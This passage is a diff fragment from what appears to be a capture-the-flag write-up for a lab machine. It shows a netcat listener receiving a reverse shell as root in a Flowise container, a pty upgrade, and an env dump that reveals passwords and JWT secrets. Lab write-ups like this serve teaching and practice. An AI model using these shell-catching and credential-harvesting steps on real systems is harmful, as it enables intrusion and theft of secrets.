@@ -232,3 +232,56 @@ if __name__ == "__main__":
 
 ```
 
+``` bash
+
+❯ sudo nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.129.92.34] 46689
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+/ # hostname
+hostname
+c78c3cceb7ba
+/ # whoami
+whoami
+root
+/ #
+
+```
+
+``` bash
+
+/ # env
+env
+FLOWISE_PASSWORD=F1l3_d0ck3r
+ALLOW_UNAUTHORIZED_CERTS=true
+NODE_VERSION=20.19.4
+HOSTNAME=c78c3cceb7ba
+YARN_VERSION=1.22.22
+SMTP_PORT=1025
+SHLVL=4
+PORT=3000
+HOME=/root
+OLDPWD=/dev
+SENDER_EMAIL=ben@silentium.htb
+PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
+JWT_ISSUER=ISSUER
+JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
+LLM_PROVIDER=nvidia-nim
+SMTP_USERNAME=test
+SMTP_SECURE=false
+JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
+FLOWISE_USERNAME=ben
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+DATABASE_PATH=/root/.flowise
+JWT_TOKEN_EXPIRY_IN_MINUTES=360
+JWT_AUDIENCE=AUDIENCE
+SECRETKEY_PATH=/root/.flowise
+PWD=/
+SMTP_PASSWORD=r04D!!_R4ge
+NVIDIA_NIM_LLM_MODE=managed
+SMTP_HOST=mailhog
+JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
+SMTP_USER=test
+/ #
+
+```
